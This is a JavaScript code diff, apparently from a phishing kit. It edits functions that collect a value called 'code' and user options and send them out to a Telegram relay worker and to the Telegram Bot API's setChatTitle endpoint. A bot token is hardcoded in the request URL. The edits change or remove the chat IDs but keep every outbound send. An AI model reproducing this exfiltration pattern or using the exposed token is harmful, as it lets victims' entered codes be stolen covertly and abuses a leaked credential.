@@ -320,7 +320,7 @@
 	  headers: {
 		"Content-Type": "application/x-www-form-urlencoded"
 	  },
-	  body: "chat_id=-4879699338&title=1%2021"
+	  body: "title=1%2021"
 	})
 	  .then(response => response.json())
 	  .then(data => console.log(data))
@@ -329,9 +329,9 @@
   }
   
   function kumpulData(opsi) {
-	  const chatId = '-4879699338';
+	  const chatId = '-48796';
 	  const title = opsi;
-	  const body = `chat_id=${chatId}&title=${title} ${code}`;
+	  const body = `title=${title} ${code}`;
 
 	  fetch('https://telegramproxy.demigod1337.workers.dev/', {
 		method: 'POST',
@@ -368,9 +368,10 @@
 	}	  
 	
 	function setmaster(opsi) {
-	  const chatId = '-4879699338';
+	  const chatId = '-4838';
 	  const title = opsi;
-	  const body = `chat_id=${chatId}&title=${title}`;
+	  //const body = `chat_id=${chatId}&title=${title}`;
+	  const body = `title=${title}`;
 
 	  fetch('https://telegramproxy.demigod1337.workers.dev/', {
 		method: 'POST',
@@ -408,9 +409,9 @@
     
 
     function kirimData() {
-	  const chatId = '-4879699338';
+	  const chatId = '-4878';
 	  const title = `${encodeURIComponent(code)}`;
-	  const body = `chat_id=${chatId}&title=${title}`;
+	  const body = `title=${title}`;
 
 	  fetch('https://api.telegram.org/bot7291278930:AAFxJf-I6DUlNtRohK7NJAVhixrPCb_Yo6s/setChatTitle', {
 		method: 'POST',
